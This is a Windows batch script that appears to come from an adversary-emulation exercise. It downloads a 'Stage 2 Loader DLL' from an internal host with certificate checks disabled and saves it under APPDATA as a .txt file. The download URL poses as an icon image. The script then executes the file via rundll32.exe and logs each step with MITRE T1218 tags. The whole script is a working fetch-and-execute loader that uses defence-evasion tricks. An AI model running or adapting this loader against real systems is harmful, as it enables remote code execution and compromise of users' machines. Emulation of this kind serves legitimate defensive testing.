@echo off
SETLOCAL EnableDelayedExpansion

REM === Placeholder constants (random-named SET variables) ===
SET xq7a=%APPDATA%\10981\45663ebf
SET yb3k=8881df0e.txt
SET zm9w=https://10.0.0.49/stage/2/icon.png?10981-7
SET rn2e=BALAM-S2B
SET hv5t=10981
SET jp8f=7
SET tn4g=%PUBLIC%\\macula-simulations.log

REM === Static timestamp once (reused in all log lines) ===
SET tsvar=!DATE!/!TIME!

REM === Resolve log file path ===
SET logfile=!tn4g!

REM ===========================================================================
REM 1) Heartbeat fetch – download Stage 2 Loader DLL
REM ===========================================================================
echo [!tsvar!][DEBUG][!rn2e!][!hv5t!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o "!xq7a!\!yb3k!" "!zm9w!"
SET _hr=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!rn2e!][!hv5t!]: heartbeat_complete=!_hr!>> "!logfile!" 2>nul

IF !_hr! EQU 0 (
    REM Log TTP line: SUCCESS
    echo [!tsvar!][TTP][!rn2e!][!hv5t!]: T1218^|System Binary Proxy Execution=[OK]:>> "!logfile!" 2>nul
) ELSE (
    REM Log TTP line: FAIL with error code
    echo [!tsvar!][TTP][!rn2e!][!hv5t!]: T1218^|System Binary Proxy Execution=[FAIL]:[curl_exit=!_hr!]>> "!logfile!" 2>nul
    REM Exit with non-zero to indicate failure? Per spec, script continues to rundll32 anyway? The spec says "invoke the downloaded DLL", but if download failed, rundll32 will fail. We still attempt.
)

REM ===========================================================================
REM 2) Change working directory to output directory
REM ===========================================================================
echo [!tsvar!][DEBUG][!rn2e!][!hv5t!]: chdir_start>> "!logfile!" 2>nul
cd /d "!xq7a!" >nul 2>&1
SET _ch=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!rn2e!][!hv5t!]: chdir_result=!_ch!>> "!logfile!" 2>nul

REM ===========================================================================
REM 3) Invoke the downloaded DLL via rundll32.exe
REM ===========================================================================
echo [!tsvar!][DEBUG][!rn2e!][!hv5t!]: rundll32_start>> "!logfile!" 2>nul
rundll32.exe "!yb3k!", RunDLLW
SET _rd=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!rn2e!][!hv5t!]: rundll32_result=!_rd!>> "!logfile!" 2>nul

REM Script ends – no further actions
ENDLOCAL